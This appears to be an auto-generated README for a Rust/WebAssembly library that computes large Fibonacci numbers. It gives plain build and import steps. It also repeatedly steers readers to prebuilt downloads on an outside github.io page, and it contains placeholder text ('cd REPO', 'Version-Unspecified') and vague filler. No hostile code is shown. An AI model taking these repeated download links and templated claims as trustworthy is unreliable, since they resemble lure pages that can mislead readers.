# Fibonacci Big Number - Arbitrary-Precision Numeric Library 2026

> **Calculate Fibonacci values at indexes far beyond the `u64` limit with Fibonacci Big Number, a Rust and WebAssembly library designed for direct use in web applications.**

[![Platform](https://img.shields.io/badge/Platform-WebAssembly-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Unspecified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/gabesmataylor9007/fibonacci-big-number-lib?style=flat-square)](https://github.com/gabesmataylor9007/fibonacci-big-number-lib)

---

<p align="center">
  <a href="https://gabesmataylor9007.github.io/fibonacci-big-number-lib/">
    <img src="https://img.shields.io/badge/Download-Fibonacci%20Big%20Number%20Latest-brightgreen?style=for-the-badge" alt="Download Fibonacci Big Number">
  </a>
</p>

> **[Download Fibonacci Big Number](https://gabesmataylor9007.github.io/fibonacci-big-number-lib/)**

---

[Download Latest Build](https://gabesmataylor9007.github.io/fibonacci-big-number-lib/)

---

## Overview

Fibonacci Big Number calculates arbitrary-precision values from the Fibonacci sequence. It is intended for indexes whose results no longer fit inside a conventional 64-bit unsigned integer.

Built with Rust and compiled to WebAssembly through `wasm-pack`, the library can be used in web-focused software and other environments that need to call Fibonacci calculations through imports instead of fixed-width numeric types.

---

## What It Provides

- Returns the nth Fibonacci number.
- Supports results outside the `u64` numeric range.
- Performs calculations with arbitrary-precision numbers.
- Uses Rust as its implementation language.
- Produces web-targeted builds with `wasm-pack`.
- Allows applications to import the calculation functionality directly.
- Includes a distribution workflow centered on WebAssembly.

---

## Getting Started

### Obtain the source

```bash
git clone https://github.com/gabesmataylor9007/fibonacci-big-number-lib.git
cd REPO
```

### Generate the WebAssembly package

With Rust and `wasm-pack` installed, create the package by running:

```bash
wasm-pack build --target web
```

Once the command completes, the generated output can be loaded by a compatible web project.

### Use a published package

If you do not want to build locally, download the available WebAssembly distribution from the [latest build](https://gabesmataylor9007.github.io/fibonacci-big-number-lib/).

---

## Calling the Library

Import the generated package into a web application, initialize the WebAssembly module, and then call the exported function:

```javascript
import init, { fibonacci } from "./pkg/fibonacci_big_number.js";

await init();

const value = fibonacci(1000);
console.log(value);
```

The usual process looks like this:

1. Determine the Fibonacci index your application needs.
2. Compile the Rust project with `wasm-pack`.
3. Add the generated WebAssembly package to the application.
4. Wait for module initialization before invoking the exported calculation function.
5. Pass the resulting large-number value to the rest of the application.

The precise exported function signature can vary with the library implementation and the version of the generated package.

---

## Build Configuration

The available project metadata does not specify a separate application configuration format. Instead, build behavior comes from the Rust project and the `wasm-pack` invocation used to generate the WebAssembly package.

For the standard web target, run:

```bash
wasm-pack build --target web
```

Additional project-specific options may be supplied through the repository's Rust and WebAssembly tooling configuration.

---

## Prerequisites

- Rust toolchain
- `wasm-pack`
- A web environment that supports WebAssembly
- A browser or application runtime able to load WebAssembly modules
- Enough memory to complete the requested arbitrary-precision calculation

---

## Frequently Asked Questions

### What is calculated by Fibonacci Big Number?

The library produces the nth number in the Fibonacci sequence.

### Does it support values larger than `u64`?

Yes. Its purpose is to handle Fibonacci results that exceed the capacity of a 64-bit unsigned integer.

### What platforms does it target?

Fibonacci Big Number targets WebAssembly and is built for web applications using `wasm-pack`.

### How can I regenerate the package after an update?

Fetch the newest repository changes and run the build again:

```bash
git pull
wasm-pack build --target web
```

### Where does the project keep its settings?

The available project information does not identify a dedicated settings file. Rust project configuration and the WebAssembly build process control build and integration behavior.

### What steps should I take when the build fails?

Make sure both Rust and `wasm-pack` are installed, run the command from the repository directory, and confirm that the local toolchain supports the selected WebAssembly target.

### Where can I ask for assistance?

Create an issue in the project repository. Include the command you ran, relevant environment information, and the complete build or runtime output.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
